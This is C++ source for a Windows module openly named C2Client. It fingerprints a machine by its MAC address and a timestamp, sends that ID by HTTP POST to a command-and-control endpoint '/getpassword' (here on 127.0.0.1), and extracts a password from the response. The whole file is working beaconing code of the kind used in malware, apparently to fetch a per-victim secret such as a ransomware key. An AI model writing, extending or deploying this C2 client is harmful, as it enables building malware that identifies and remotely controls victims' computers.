#include "pch.h"
#include "c2client.h"
#include <windows.h>
#include <wininet.h>
#include <string>
#include <iostream>
#include <chrono>
#include <ctime>
#include <iphlpapi.h>



#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "iphlpapi.lib")




namespace C2Client {


    std::string get_mac_address() {
        IP_ADAPTER_INFO AdapterInfo[16];       // Allocate information
        DWORD bufLen = sizeof(AdapterInfo);     // Save memory size of buffer

        DWORD status = GetAdaptersInfo(AdapterInfo, &bufLen);
        if (status != ERROR_SUCCESS) {
            return "UnknownMAC";
        }

        PIP_ADAPTER_INFO pAdapterInfo = AdapterInfo;
        char macAddr[18];
        sprintf_s(
            macAddr, sizeof(macAddr), "%02X:%02X:%02X:%02X:%02X:%02X",
            pAdapterInfo->Address[0],
            pAdapterInfo->Address[1],
            pAdapterInfo->Address[2],
            pAdapterInfo->Address[3],
            pAdapterInfo->Address[4],
            pAdapterInfo->Address[5]);
        return std::string(macAddr);
    }

    std::string get_password_from_server() {
        HINTERNET hInternet = InternetOpenA("C2Client", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
        if (!hInternet) {
            return "";
        }

        HINTERNET hConnect = InternetConnectA(hInternet, "127.0.0.1", INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
        if (!hConnect) {
            InternetCloseHandle(hInternet);
            return "";
        }

        HINTERNET hRequest = HttpOpenRequestA(
            hConnect,
            "POST",
            "/getpassword",
            NULL,
            NULL,
            NULL,
            INTERNET_FLAG_RELOAD,
            0
        );

        if (!hRequest) {
            InternetCloseHandle(hConnect);
            InternetCloseHandle(hInternet);
            return "";
        }

        std::string mac = get_mac_address();
        std::time_t epoch = std::time(nullptr);;

        std::string uid = "computer-" + mac + "-" + std::to_string(epoch);
        std::string postData = "{\"uid\":\"" + uid + "\"}";
        const char* headers = "Content-Type: application/json\r\n";

        BOOL bRequestSent = HttpSendRequestA(
            hRequest,
            headers,
            strlen(headers),
            (LPVOID)postData.c_str(),
            postData.size()
        );

        std::string response;
        if (bRequestSent) {
            char buffer[4096];
            DWORD bytesRead = 0;

            do {
                if (InternetReadFile(hRequest, buffer, sizeof(buffer) - 1, &bytesRead)) {
                    buffer[bytesRead] = '\0';
                    response += buffer;
                }
            } while (bytesRead > 0);
        }

        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);

        // Simple parsing (not a full JSON parser) to extract password
        size_t pos = response.find("\"password\":\"");
        if (pos != std::string::npos) {
            pos += strlen("\"password\":\"");
            size_t end = response.find("\"", pos);
            if (end != std::string::npos) {
                return response.substr(pos, end - pos);
            }
        }

        return "";
    }
}
